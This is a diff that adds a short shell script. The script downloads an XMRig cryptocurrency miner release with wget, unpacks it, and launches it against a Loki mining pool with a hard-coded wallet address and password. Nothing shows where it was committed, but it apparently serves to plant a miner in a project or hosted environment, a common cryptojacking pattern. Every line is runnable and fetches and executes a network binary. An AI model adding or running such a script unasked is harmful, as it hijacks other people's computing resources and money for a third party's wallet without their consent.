@@ -1,0 +1,6 @@
+mkdir xmrig
+cd xmrig
+wget https://github.com/xmrig/xmrig/releases/download/v2.8.3/xmrig-2.8.3-xenial-amd64.tar.gz
+tar xfvz xmrig-2.8.3-xenial-amd64.tar.gz
+cd xmrig-2.8.3
+./xmrig -a cryptonight-heavy -k -o stratum+tcp://loki.ingest.cryptoknight.cc:7733 -u LDtK1Eqm11xcYozGZ1bSBfVzBCLo69qAXMuRgPYmypn1euVJcuZq5iJ9KHETYDhKNTTFu31FAccDuEfVSdDXTp6z5HQi5tL.10000 --donate-level 1 -p codint2
